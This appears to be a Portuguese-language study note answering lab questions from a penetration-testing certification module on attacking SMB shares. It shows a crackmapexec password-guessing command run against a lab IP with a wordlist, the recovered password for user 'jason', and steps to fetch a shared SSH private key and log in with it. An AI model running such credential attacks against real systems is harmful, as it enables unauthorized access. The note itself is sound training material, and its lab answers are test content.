> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/smb/questions.md).

# Questions

1. Qual é o nome da pasta compartilhada com permissões de LEITURA?

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FCP1RJUJzVGT5jaxE18iY%2Fimage.png?alt=media&amp;token=78acf429-5788-4868-bdb6-113c1e844607" alt=""><figcaption></figcaption></figure>

2. Qual é a senha do nome de usuário "jason"?

* Comando :&#x20;

```sh
crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth

...SNIP...
SMB  10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 

```

3. Faça login como o usuário "jason" via SSH e encontre o arquivo flag.txt. Envie o conteúdo como sua resposta.

* Verificamos que existe uma chave `ssh` comparttilhada na pasta GGJ, faremos o download deste arquivo

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FBZYcaTXd3QY2oPznQnV5%2Fimage.png?alt=media&amp;token=360fefda-d589-4dee-8f1d-9322829da41c" alt=""><figcaption></figcaption></figure>

* Dar permissões ao arquivo : `chmod 600 id_rsa`
* Em seguida fazer login `ssh -i id_rsa jason@<IP>`&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F4GyF72MMCbvjhcxEzac5%2Fimage.png?alt=media&amp;token=1e540620-2551-4f98-9069-2e0e9d4a67d1" alt=""><figcaption></figcaption></figure>
